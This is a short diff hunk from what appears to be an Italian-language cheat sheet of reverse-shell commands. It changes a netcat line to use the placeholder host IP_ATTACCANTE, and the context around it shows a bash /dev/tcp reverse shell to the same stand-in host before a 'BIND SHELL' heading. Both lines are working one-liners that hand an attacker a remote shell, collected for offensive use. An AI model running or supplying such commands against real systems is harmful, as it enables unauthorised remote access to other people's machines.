@@ -72,7 +72,7 @@ bash -i >& /dev/tcp/IP_ATTACCANTE/4242 0>&1
 
 #### netcat
 ```
-ncat 10.0.0.1 4242 -e /bin/bash
+ncat IP_ATTACCANTE 4242 -e /bin/bash
 ```
 
 ## BIND SHELL
